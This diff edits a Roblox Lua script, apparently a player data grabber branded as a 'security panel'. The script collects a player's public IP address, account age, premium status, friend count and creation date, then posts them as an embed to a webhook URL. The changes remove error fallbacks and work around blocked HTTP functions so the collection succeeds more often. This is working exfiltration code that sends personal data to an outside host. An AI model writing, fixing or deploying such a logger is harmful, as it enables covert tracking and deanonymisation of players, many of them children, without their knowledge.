@@ -17,30 +17,31 @@ local function GetUserData()
     local premium = lp.MembershipType == Enum.MembershipType.Premium and "Sim" or "Não"
     local age = lp.AccountAge
     local friend_count = 0
-    local public_ip = "HTTP Disabled / Erro API"
+    local public_ip = "Obtendo..."
 
-    -- 1. TENTATIVA DE PEGAR O IP COM TRATAMENTO DE ERRO
-    local success, result = pcall(function()
-        return HttpService:GetAsync("https://api.ipify.org?format=json")
+    -- 1. PEGAR O IP (Corrigido para não usar função bloqueada)
+    pcall(function()
+        local response = HttpService:GetAsync("https://api.ipify.org?format=json")
+        local data = HttpService:JSONDecode(response)
+        public_ip = data.ip
     end)
 
-    if success then
-        local data = HttpService:JSONDecode(result)
-        public_ip = data.ip
-    else
-        -- Se falhar, pode ser que o HTTP esteja desativado nas configs do mapa
-        public_ip = "Permissão Negada (Ative o HTTP)"
-    end
-
-    -- 2. QUANTIDADE DE AMIGOS
+    -- 2. QUANTIDADE DE AMIGOS (Usando Proxy ou API via GetAsync se permitido)
+    -- Nota: APIs diretas do roblox.com podem ser bloqueadas em certos contextos.
+    -- Se falhar, o pcall evita o erro no console.
     pcall(function()
-        local friend_info = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..user_id.."/friends/count"))
+        local url = "https://friends.roblox.com/v1/users/"..user_id.."/friends/count"
+        -- Se estiver no Roblox oficial, você precisará de um Proxy para acessar APIs do roblox.com
+        local response = HttpService:GetAsync(url)
+        local friend_info = HttpService:JSONDecode(response)
         friend_count = friend_info.count
     end)
 
     -- 3. DATA DE CRIAÇÃO
     pcall(function()
-        local info = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..user_id))
+        local url = "https://users.roblox.com/v1/users/"..user_id
+        local response = HttpService:GetAsync(url)
+        local info = HttpService:JSONDecode(response)
         if info and info.created then
             local date = info.created:sub(1, 10)
             local y, m, d = date:match("(%d+)-(%d+)-(%d+)")
@@ -56,10 +57,10 @@ local function GetUserData()
             ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
             ["color"] = 11097043,
             ["thumbnail"] = {["url"] = thumb},
-            ["footer"] = {["text"] = "Painel Kovarik Security | 2026"},
+            ["footer"] = {["text"] = "Painel Kovarik Security"},
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
-                {["name"] = "Premium", ["value"] = premium, ["inline"] = true},
+                {["name"] = "Premium Status", ["value"] = premium, ["inline"] = true},
                 {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
                 {["name"] = "Friends", ["value"] = tostring(friend_count), ["inline"] = true},
                 {["name"] = "Account Age", ["value"] = age .. " dias", ["inline"] = true},
@@ -68,14 +69,13 @@ local function GetUserData()
         }}
     }
 
-    -- 4. ENVIO FINAL
-    local sendSuccess, sendError = pcall(function()
-        local jsonData = HttpService:JSONEncode(data)
-        HttpService:PostAsync(Webhook_URL, jsonData)
+    -- 4. ENVIO PARA WEBHOOK
+    local success, err = pcall(function()
+        HttpService:PostAsync(Webhook_URL, HttpService:JSONEncode(data))
     end)
     
-    if not sendSuccess then
-        warn("Falha ao enviar Webhook: " .. tostring(sendError))
+    if not success then
+        warn("Erro ao enviar: " .. err)
     end
 end
 
